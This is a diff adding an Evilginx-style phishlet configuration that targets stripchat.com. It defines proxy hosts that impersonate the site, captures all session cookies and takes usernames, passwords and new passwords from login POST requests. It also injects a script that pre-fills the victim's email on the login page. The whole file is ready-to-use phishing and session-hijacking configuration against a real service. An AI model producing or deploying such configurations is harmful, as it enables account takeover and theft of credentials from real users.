@@ -1,0 +1,55 @@
+author: '@luffy'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'stripchat.com', session: true, is_landing: true}
+  - {phish_sub: 'platform', orig_sub: 'platform', domain: 'stripchat.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'stripchat.global', session: true, is_landing: false}
+  - {phish_sub: 'platform', orig_sub: 'platform', domain: 'stripchat.global', session: false, is_landing: false}  
+
+sub_filters:
+  - {triggers_on: 'www.stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.stripchat.com', orig_sub: '', domain: 'stripchat.global', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.stripchat.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.stripchat.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+ 
+
+auth_tokens:
+  - domain: '.www.stripchat.com'
+    keys: ['.*,regexp']
+  - domain: '.stripchat.com'
+    keys: ['.*,regexp']
+  
+credentials:
+  username:
+    key: 'session_key'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'session_password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'newPassword'
+      search: '(.*)'
+      type: 'post'
+login:
+  domain: 'www.stripchat.com'
+  path: '/login'
+
+js_inject:
+  - trigger_domains: ["www.stripchat.com"]
+    trigger_paths: [""]
+    trigger_params: ["email"]
+    script: |
+      function lp(){
+        var email = document.querySelector("#username");
+        var password = document.querySelector("#password");
+        if (email != null && password != null) {
+          email.value = "{email}";
+          password.focus();
+          return;
+        }
+        setTimeout(function(){lp();}, 100);
+      }
+      setTimeout(function(){lp();}, 100);
